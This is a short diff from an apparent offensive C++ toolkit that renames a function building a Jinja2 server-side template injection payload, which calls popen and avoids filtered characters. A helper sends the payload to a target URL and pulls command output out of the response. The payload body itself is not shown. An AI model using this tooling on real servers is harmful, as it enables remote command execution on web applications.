@@ -7,7 +7,7 @@
 #include "murk/random.hpp"
 
 namespace murk::web {
-  std::string flask(std::string_view cmd, std::string delim, bool pretty) {
+  std::string jinja2(std::string_view cmd, std::string delim, bool pretty) {
     // Based on https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset
     //
     // I then modified out any underscores, square brackets and dots
@@ -41,7 +41,7 @@ namespace murk::web {
   std::string flask_get(std::string_view addr, std::string_view cmd) {
     std::string s{addr};
     std::string str = random::random_alnum(16);
-    s += uri::encode(flask(cmd, str, false));
+    s += uri::encode(jinja2(cmd, str, false));
     auto res = murk::web::http::get({s});
 
     return bounded(res.body, str);
